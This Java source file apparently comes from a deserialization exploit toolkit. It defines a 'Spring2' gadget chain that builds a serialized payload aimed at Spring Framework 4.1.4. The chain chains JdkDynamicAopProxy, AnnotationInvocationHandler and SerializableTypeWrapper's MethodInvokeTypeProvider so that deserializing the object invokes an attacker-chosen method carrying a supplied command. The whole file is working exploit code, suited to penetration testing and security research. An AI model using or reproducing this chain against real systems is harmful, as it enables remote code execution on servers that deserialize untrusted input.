package org.ses.gadgetbuilder.chains1;

import org.ses.gadgetbuilder.adapters.MethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;
import org.ses.gadgetbuilder.exceptions.AdapterMismatchException;
import org.ses.gadgetbuilder.util.Reflections;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.target.SingletonTargetSource;

import java.io.Serializable;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.lang.reflect.Type;
import java.util.HashMap;
import java.util.Map;

@Dependencies( {
        "org.springframework:spring-core:4.1.4.RELEASE", "org.springframework:spring-aop:4.1.4.RELEASE",
        // test deps
        "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2"
} )
@Authors({ Authors.MBECHLER })
@Impact(Impact.MethodInvoke)
public class Spring2 extends MethodInvokeGadgetChain<NoTrampoline, MethodInvokeAdapter> {

    public Spring2(MethodInvokeAdapter _adapter) {
        super(NoTrampoline.getInstance(), _adapter);
    }

    public Spring2(NoTrampoline _trampoline, MethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        Object payload = this.methodInvokeAdapter.getInvocationTarget(command);


        AdvisedSupport as = new AdvisedSupport();
        as.setTargetSource(new SingletonTargetSource(payload));

        InvocationHandler jdkDynamicAopProxy = (InvocationHandler) Reflections
                .getFirstCtor("org.springframework.aop.framework.JdkDynamicAopProxy")
                .newInstance(as);

        Class targetInterface = this.methodInvokeAdapter.getTargetInterface();

        if (targetInterface == null) {
            throw new AdapterMismatchException("Spring gadget chain requires a sink method adapter class that has interfaces " +
                    "corresponding to the to be invoked methods. This is not the case for " + this.methodInvokeAdapter.getClass().getSimpleName());
        }

        final Type typeTemplatesProxy = (Type) Proxy.newProxyInstance(
                Spring1.class.getClassLoader(), new Class[] {Type.class, targetInterface}, jdkDynamicAopProxy);

        Map handlerMap = new HashMap<>();
        handlerMap.put("getType", typeTemplatesProxy);

        InvocationHandler annotationInvocationHandler = (InvocationHandler) Reflections
                .getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler")
                .newInstance(Override.class, handlerMap);

        final Object typeProviderProxy = Proxy.newProxyInstance(Spring1.class.getClassLoader(),
                new Class[] { Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider")}, annotationInvocationHandler);

        Object mitp = Reflections.createWithoutConstructor(Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider"));
        Reflections.setFieldValue(mitp, "provider", typeProviderProxy);
        Reflections.setFieldValue(mitp, "methodName", this.methodInvokeAdapter.getMethodName());
        return new TrampolineConnector(mitp);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "SerializableTypeWrapper$MethodInvokeTypeProvider.readObject(ObjectInputStream)\n" +
                "Method.invoke(Object, Object...)\n" +
                "$Proxy0.newTransformer()\n" +
                "JdkDynamicAopProxy.invoke(Object, Method, Object[])\n" +
                "AopUtils.invokeJoinpointUsingReflection(Object, Method, Object[])\n" +
                "Method.invoke(Object, Object...)";
    }
}
